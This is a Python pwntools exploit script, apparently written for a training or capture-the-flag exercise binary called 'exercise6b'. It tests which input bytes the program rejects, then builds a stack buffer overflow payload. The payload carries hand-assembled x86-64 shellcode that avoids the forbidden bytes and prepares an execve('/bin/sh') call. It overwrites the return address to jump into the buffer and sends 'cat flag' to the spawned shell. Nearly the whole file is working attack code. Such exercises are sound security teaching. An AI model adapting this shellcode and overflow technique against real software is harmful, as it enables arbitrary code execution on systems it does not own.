#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
from advancedpwn import ida
import re

from pwnlib import timeout

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise6b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

context.binary = exe
context.log_level = "critical"
proxy = None

def signal_handler(signum, frame):
    global proxy
    if proxy is not None:
        proxy.exit_process()
        log.info("Killed IDA debugger window!")
    exit(0)

signal.signal(signal.SIGINT, signal_handler)  # Add IDA killer to process kill

def test_forbidden_single(val):
    r = context.binary.process()
    r.sendline(b"1\n")
    r.recvuntil(b"Enter your note:")
    r.sendline(p8(val))
    res = r.recvall(timeout=.1).decode() 
    return "illegal" in res

def test_forbidden():
    # Forbidden chars:
    forbidden_read = "05 0A 0D 0F 1E 82 8B 91 95 99 1E A4 A6 A9 CD D2 E6 F6 C8 B8 DA BC C4 CF C3 BF DD CE E0 E9 F3 FF".split(' ')
    for a in forbidden_read:
        val = int(a, 16)
        print(f"{hex(val)} was {test_forbidden_single(val)} but {hex(val+1)} was {test_forbidden_single(val+1)}")
    # list seems accurate except the 0A ???

def exploitStart():
    global proxy
    r = context.binary.process()
    print(cyclic_find(0x61616173)) # 72
    print(cyclic_find(0x61616167)) # 32

    forbidden = "05 0D 0F 1E 82 8B 91 95 99 1E A4 A6 A9 CD D2 E6 F6 C8 B8 DA BC C4 CF C3 BF DD CE E0 E9 F3 FF".split(' ')
    forbidden_h = []
    forbidden_b = []
    for forb in forbidden:
        h = int(forb, 16)
        forbidden_h.append(h)
        forbidden_b.append(h.to_bytes(1, byteorder='big'))
    # Let's try the encoder
    shell = asm(shellcraft.amd64.sh())
    weird = {'\x05', '\r', '\x0f', '\x1e', '\x82', '\x8b', '\x91', '\x95', '\x99', '\x1e', '¤', '¦', '©', 'Í', 'Ò', 'æ', 'ö', 'È', '¸', 'Ú', '¼', 'Ä', 'Ï', 'Ã', '¿', 'Ý', 'Î', 'à', 'é', 'ó', 'ÿ'}
    new_shell = encoders.i386.delta.encode(shell, weird)
    #print(forbidden_b)
    #print(new_shell) # Does not work ....

    # nops: https://reverseengineering.stackexchange.com/questions/11971/nop-with-argument-in-x86-64
    # 2B: 66 90 -> should work
    nop = 0x9066
    jmp_buf_add = 0x0401616
    buf_start = 0x07FFFFFFFDCC0
    buf_end = 0x07FFFFFFFDDB8 # 248 --> 15 stack addresses to jump to
    read_plt_add = 0x0404070
    read_plt_sec_add = 0x0401270
    payload = b"A"*32
    # first stage shell
    # read(int fildes, void *buf, size_t nbyte);
    # read(0, )
    # RDI, RSI, RDX, RCX, R8, R9
    fst_stage = """
    xor r12, r12

    mov rsi, r13
    sub rsi, rax
    nop
    lea r8, [ rsi + 0xe ]
    nop
    lea rdi, [ r8 + 1 ]
    lea r8, [ r8 + 0x8 ]
    mov [r8], r12

    lea r12, [ r12 + 4]
    lea r12, [ r12 + 1 ]
    sal r12, 8
    lea r12, [ r12 + 0x0e ]
    lea r12, [ r12 + 1 ]
    lea r8, [ rsi - 3 ]
    mov [r8], r12

    xor r8, r8
    mov rsi, r8
    mov rdx, r8
    xor r12, r12
    lea rax, [ r12 + 59 ]
    """
    #    lea r12, [ rsi + 0 ]
    #sar r12, 16
    #lea r8, [ rsi + 1 ]
    #mov [r8], r12
    # vpcmpeqd ymm0, ymm0, ymm0
    # vmovdqa [r8], ymm0
    print(asm("syscall"))
    # call read would be E8  14 FE FF FF
    # write to the stack addr of rsi, E8 14 FE FE 5F in the correct place
    # then add rax and nop slide from DCF5 to DD3F into the read
    payload += asm(fst_stage)
    payload += p16(nop)*int((0xDD3F - 0xDCFA)/2-18) # not really nop, but works
    payload += b'\xE8\x14\xFE\xFE\x5F'
    # finish overflow and jump
    payload += b"/bin/sh"*2
    assert len(payload) <= 0x108
    payload += cyclic(0x108-len(payload)) + p64(jmp_buf_add)
    print(payload)

    # do forbidden check
    for forb in forbidden:
        if int(forb, 16) in payload:
            raise Exception(f"Char forbidden: {forb}")
    #return
    #proxy = ida.attach(r, "192.168.127.1", ida_start_port=31337, binary_path=context.binary.path)
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # You can now communicate with the process, e.g.,
    r.sendline(b"1\n")
    r.recvuntil(b"Enter your note:")
    
    r.sendline(payload)
    # Now read second stage which is just a shell
    #print(r.recvall(timeout=15).decode())
    r.sendline(b"cat flag")
    print(r.recvall(timeout=3).decode())
    #r.interactive()
    
if __name__ == '__main__':
    exploitStart()